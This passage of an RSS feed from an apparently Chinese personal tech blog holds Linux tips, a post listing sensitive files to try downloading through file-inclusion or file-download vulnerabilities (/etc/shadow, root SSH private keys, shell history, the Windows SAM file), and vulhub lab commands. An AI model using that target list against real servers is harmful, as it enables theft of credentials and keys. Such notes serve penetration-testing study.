代理端口 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# git config --global http.proxy &amp;#x27;socks5://windows 的 ip: 代理端口 &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# git config --global https.proxy &amp;#x27;socks5://windows 的 ip: 代理端口 &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;批量添加后缀名。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# find . -type f | awk -F &amp;quot;.&amp;quot; &amp;#x27;&amp;#123;print $2&amp;#125;&amp;#x27; | xargs -i -t mv ./&amp;#123;&amp;#125; ./&amp;#123;&amp;#125;.apk&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看 python 版本。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#  ls /usr/bin/python*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;添加 python 版本。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#  sudo update-alternatives --install /usr/bin/python python /usr/bin/python3.6 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;查看和更换 python 版本。&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#  update-alternatives --config python&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;解决 apt install 失败的问题&lt;br /&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# sudo apt-get install aptitude&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# sudo aptitude install &amp;lt;package-name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 之后从 aptitude 提供的解决方案中选择一种使用。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/08/20/cybersecurity/file-download/</guid>
            <title>文件包含漏洞可以尝试下载的文件</title>
            <link>http://ericcd.com/2022/08/20/cybersecurity/file-download/</link>
            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
            <pubDate>Sat, 20 Aug 2022 16:20:20 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;记录一些利用文件下载漏洞下载的目标文件。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;br /&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#    Windows&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\boot.ini// 查看系统版本 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Windows\System32\inetsrv\MetaBase.xml//IIS 配置文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Windows\repair\sam // 存储系统初次安装的密码 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Program Files\mysql\my.ini//Mysql 配置 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Program Files\mysql\data\mysql\user.MYD//Mysql root&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Windows\php.ini//php 配置信息 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Windows\my.ini//Mysql 配置信息 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    C:\Windows\win.ini//Windows 系统的一个基本系统配置文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    Linux&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /root/.ssh/authorized_keys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /root/.ssh/id_rsa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /root/.ssh/id_ras.keystore&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /root/.ssh/known_hosts// 记录每个访问计算机用户的公钥 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /etc/passwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /etc/shadow&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /usr/local/app/php5/lib/php.ini//PHP 配置文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /etc/my.cnf//mysql 配置文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /etc/httpd/conf/httpd.conf//apache 配置文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /root/.bash_history// 用户历史命令记录文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /root/.mysql_history//mysql 历史命令记录文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /proc/mounts// 记录系统挂载设备 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /porc/config.gz// 内核配置文件 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /var/lib/mlocate/mlocate.db// 全文件路径 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#    /porc/self/cmdline// 当前进程的 cmdline 参数 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://ericcd.com/2022/07/23/cybersecurity/vulhub-command/</guid>
            <title>vulhub 相关命令</title>
            <link>http://ericcd.com/2022/07/23/cybersecurity/vulhub-command/</link>
            <category term="网络安全" scheme="http://ericcd.com/categories/cybersecurity/" />
            <pubDate>Sat, 23 Jul 2022 11:45:16 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;使用 vulhub 时会用到的命令。&lt;br /&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;下载-vulhub&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#下载-vulhub&#34;&gt;#&lt;/a&gt; 下载 vulhub&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# unzip vulhub-master.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# cd vulhub-master&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;编译环境&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#编译环境&#34;&gt;#&lt;/a&gt; 编译环境&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# docker-compose build&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;启动环境&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#启动环境&#34;&gt;#&lt;/a&gt; 启动环境&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h1 id=&#34;移除环境&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#移除环境&#34;&gt;#&lt;/a&gt; 移除环境&lt;/h1&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;# docker-compose down -v&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
